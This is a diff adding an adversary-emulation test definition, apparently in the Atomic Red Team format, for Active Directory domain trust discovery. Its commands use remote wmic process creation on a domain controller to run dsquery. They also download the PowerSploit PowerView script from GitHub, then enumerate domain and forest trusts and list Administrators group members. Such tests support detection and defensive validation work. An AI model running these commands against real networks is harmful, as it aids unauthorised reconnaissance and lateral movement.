@@ -1,0 +1,43 @@
+attack_technique: T1482A
+display_name: Domain Trust Discovery
+atomic_tests:
+- name: Windows - Discover domain trusts with dsquery
+  auto_generated_guid: fb1379e6-e4dd-4703-870b-3ef4ce2e21e4
+  description: |
+    Uses the dsquery command to discover domain trusts.
+    Requires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.
+  supported_platforms:
+  - windows
+  input_arguments:
+    DC_IP:
+      description: DC Address
+      type: String
+      default: '192.168.1.100'   
+  executor:
+    command: |
+      wmic /node:#{DC_IP} process call create "dsquery * -filter '(objectClass=trustedDomain)' -attr *"
+    name: command_prompt
+- name: Powershell enumerate domains and forests
+  auto_generated_guid: 34d2646c-d899-11eb-b8bc-0242ac130003
+  description: |
+    Use powershell to enumerate AD information.
+    Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.
+  supported_platforms:
+  - windows
+  input_arguments:
+    DC_IP:
+      description: DC Address
+      type: String
+      default: '192.168.1.100'   
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      PowerView PowerShell script must exist on disk
+    prereq_command: |
+      if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}
+    get_prereq_command: |
+      wmic /node:#{DC_IP} process call create "powershell  Invoke-WebRequest 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -OutFile '$env:TEMP\PowerView.ps1'"
+  executor:
+    command: |
+      wmic /node:#{DC_IP} process call create "powershell Import-Module '$env:TEMP\PowerView.ps1';Get-NetDomainTrust;Get-NetForestTrust;Get-ADDomain;Get-ADGroupMember Administrators -Recursive"
+    name: powershell
